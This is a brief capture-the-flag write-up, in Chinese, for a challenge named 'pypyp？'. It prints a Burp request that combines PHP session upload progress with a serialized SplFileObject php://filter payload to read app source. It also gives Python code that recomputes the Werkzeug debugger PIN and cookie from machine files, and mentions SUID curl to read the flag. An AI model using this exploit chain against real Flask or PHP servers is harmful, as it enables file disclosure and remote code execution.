---
tags: [PHP LFI, SESSION_UPLOAD_PROGRESS, Werkzeug调试器, PIN码计算, RCE, Python, PHP]
---

# pypyp？

burp包

```
POST / HTTP/1.1
Host: 115.239.215.75:8081
Content-Length: 550
Cookie: PHPSESSID=RABBIT
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3wRkBuO1AXkzMQUZ
Connection: close

------WebKitFormBoundary3wRkBuO1AXkzMQUZ
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

aaa
------WebKitFormBoundary3wRkBuO1AXkzMQUZ
Content-Disposition: form-data; name="data"

a:2:{s:4:"type";s:13:"SplFileObject";s:10:"properties";a:2:
{i:0;s:60:"php://filter/read=convert.base64-encode/resource=/app/app.py";i:1;s:1:"r";}}
------WebKitFormBoundary3wRkBuO1AXkzMQUZ
Content-Disposition: form-data; name="hh"; filename="rubbish"
Content-Type: application/octet-stream

aaa
------WebKitFormBoundary3wRkBuO1AXkzMQUZ--
```

有soap,flask开了debug

flask算pin有坑 所以直接把服务器上的/usr/lib/python3.8/site-packages/werkzeug/debug/***\*init\****.py扒下来改改绝对不会错(名字是用_GlobIterator找到的

算cookie

```
def calc_cookie():
rv = None
num = None
# This information only exists to make the cookie unique on the
# computer, not as a security feature.
probably_public_bits = [
'app',
'flask.app',
'Flask',
'/usr/lib/python3.8/site-packages/flask/app.py',
]
private_bits =
[str(int(readfile( '/sys/class/net/eth0/address').decode().strip().replace( ':', ''),
16)),
readfile( '/proc/sys/kernel/random/boot_id').decode().strip()+readfile( '/proc/self/cgrou
p').decode().split( '\n')[0].strip().rpartition("/")[2]]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode("utf-8")
h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"
if num is None:
h.update(b"pinsalt")
num = f"{int(h.hexdigest(), 16):09d}"[:9]
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = "-".join(
num[x : x + group_size].rjust(group_size, "0")
for x in range(0, len(num), group_size)
)
break
else:
rv = num
cookie_value = f"{int(time.time())} |{hash_pin(rv)}" return {cookie_name: cookie_value}
```

然后soap发过去， suid curl读flag